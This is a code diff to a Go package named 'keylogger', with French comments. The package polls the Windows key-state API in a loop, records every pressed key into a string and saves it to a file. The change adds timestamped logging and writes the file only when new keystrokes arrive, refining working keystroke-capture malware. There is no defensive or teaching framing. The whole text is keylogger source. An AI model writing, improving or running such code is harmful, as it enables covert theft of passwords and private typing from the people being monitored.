@@ -3,6 +3,7 @@ package keylogger
 import (
 	"fmt"
 	"io/ioutil"
+	"log"
 	"os"
 	"path/filepath"
 	"syscall"
@@ -23,25 +24,31 @@ func Keylogger(Content *string) {
 	dir := filepath.Dir(filePath)
 	err := os.MkdirAll(dir, os.ModePerm)
 	if err != nil {
-		fmt.Println("Erreur lors de la création du répertoire:", err)
+		log.Printf("[%s] Erreur lors de la création du répertoire: %v\n", time.Now().Format(time.RFC3339), err)
 		return
 	}
 
+	lastContent := "" // Garder une trace du contenu précédent
+
 	for {
 		time.Sleep(10 * time.Millisecond) // Ajouter une pause de 10ms pour éviter une utilisation excessive du CPU
+
+		// Vérifier si le contenu a changé depuis la dernière itération
+		if *Content != lastContent {
+			// Écrire dans le fichier uniquement si le contenu a changé
+			err := writeToFile(filePath, *Content)
+			if err != nil {
+				log.Printf("[%s] Erreur lors de l'écriture dans le fichier: %v\n", time.Now().Format(time.RFC3339), err)
+				return
+			}
+			lastContent = *Content
+		}
 
 		for KEY := 0; KEY <= 190; KEY++ {
 			Val, _, _ := getAsyncKeyState.Call(uintptr(KEY))
 			if int(Val) == -32767 {
 				(*Content) += string(KEY)
 			}
-		}
-
-		// Écrire dans le fichier à chaque itération
-		err := writeToFile(filePath, *Content)
-		if err != nil {
-			fmt.Println("Erreur lors de l'écriture dans le fichier:", err)
-			return
 		}
 	}
 }
